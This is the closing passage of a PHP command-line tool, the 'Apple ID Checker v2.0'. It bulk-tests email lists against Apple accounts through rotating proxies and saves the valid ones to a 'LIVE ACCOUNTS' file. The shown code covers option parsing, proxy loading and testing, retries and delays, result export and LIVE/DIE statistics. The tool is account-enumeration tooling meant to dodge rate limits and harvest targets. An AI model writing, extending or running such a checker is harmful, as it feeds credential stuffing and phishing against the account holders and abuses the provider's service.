                $txt .= $r['email'] . ' | ' . $r['status_label'] . $pi . "\n";
            }
        }
        $txt .= "\n--- ALL ---\n";
        foreach ($results as $r) {
            $pi = !empty($r['proxy_used']) ? ' ['.parse_url($r['proxy_used'], PHP_URL_HOST).']' : '';
            $txt .= $r['email'] . ' | ' . $r['status'] . ' | ' . $r['status_label'] . $pi . "\n";
        }
        return file_put_contents($path, $txt) !== false;
    }
}

// ============================================================
// CLI
// ============================================================

if (PHP_SAPI === 'cli' && isset($argv[0]) && basename($argv[0]) === basename(__FILE__)) {
    echo "\n=== APPLE ID CHECKER v2.0 (No-CURL) ===\n\n";
    
    $options = getopt('', [
        'email:', 'file:', 'output:', 'format:', 'timeout:', 'delay:',
        'retries:', 'no-proxy', 'proxy-file:', 'max-proxies:', 'verbose', 'help'
    ]);
    
    if (isset($options['help']) || (empty($options['email']) && empty($options['file']))) {
        echo "Usage:\n";
        echo "  php apple_checker.php --email=user@icloud.com\n";
        echo "  php apple_checker.php --file=emails.txt\n";
        echo "  php apple_checker.php --file=emails.txt --output=hasil.csv --format=csv\n";
        echo "  php apple_checker.php --file=emails.txt --delay=2000000 --retries=3\n";
        echo "  php apple_checker.php --file=emails.txt --proxy-file=proxies.txt\n";
        echo "  php apple_checker.php --file=emails.txt --max-proxies=200 --verbose\n";
        exit(0);
    }
    
    try {
        $checker = new AppleEmailChecker();
        
        if (isset($options['timeout'])) $checker->setTimeout((int)$options['timeout']);
        if (isset($options['delay'])) $checker->setDelay((int)$options['delay']);
        if (isset($options['retries'])) $checker->setMaxRetries((int)$options['retries']);
        if (isset($options['verbose'])) $checker->setVerbose(true);
        if (isset($options['no-proxy'])) $checker->setProxyRotation(false);
        
        $pg = $checker->getProxyGrabber();
        if (isset($options['max-proxies'])) $pg->setMaxProxies((int)$options['max-proxies']);
        
        if (isset($options['proxy-file'])) {
            echo "[*] Load proxies from: {$options['proxy-file']}\n";
            $proxies = $pg->loadFromFile($options['proxy-file']);
            echo "[*] Loaded " . count($proxies) . " proxies\n";
            if (!empty($proxies)) {
                echo "[*] Testing...\n";
                $pg->testAllProxies($proxies);
            }
        }
        
        if (isset($options['email'])) {
            $results = [$checker->check($options['email'])];
        } else {
            $results = $checker->checkFromFile($options['file'], !isset($options['proxy-file']));
        }
        
        echo "\n" . AppleEmailChecker::formatResults($results);
        
        if (isset($options['output'])) {
            $fmt = $options['format'] ?? 'txt';
            $ok = false;
            switch ($fmt) {
                case 'csv': $ok = AppleEmailChecker::exportToCsv($results, $options['output']); break;
                case 'json': $ok = AppleEmailChecker::exportToJson($results, $options['output']); break;
                default: $ok = AppleEmailChecker::exportToTxt($results, $checker->getStats(), $options['output']); break;
            }
            if ($ok) echo "[+] Saved to: {$options['output']}\n";
        }
        
        $live = $checker->getLiveResults();
        if (!empty($live)) {
            $lf = 'live_' . date('Ymd_His') . '.txt';
            $c = "=== LIVE ACCOUNTS ===\nDate: " . date('Y-m-d H:i:s') . "\nTotal: " . count($live) . "\n\n";
            foreach ($live as $r) $c .= $r['email'] . "\n";
            file_put_contents($lf, $c);
            echo "[+] Live accounts: $lf\n";
        }
        
        $wp = $pg->getTestedProxies();
        if (!empty($wp)) {
            $pf = 'proxies_' . date('Ymd_His') . '.txt';
            $pg->saveToFile($pf, $wp);
            echo "[+] Working proxies: $pf (" . count($wp) . ")\n";
        }
        
        $s = $checker->getStats();
        echo "\n=== STATS ===\n";
        echo "Total: {$s['total']} | LIVE: {$s['live']} | DIE: {$s['die']} | ERROR: {$s['error']} | Rotations: {$s['proxy_rotations']}\n";
        
    } catch (\Exception $e) {
        echo "ERROR: " . $e->getMessage() . "\n";
        exit(1);
    }
}
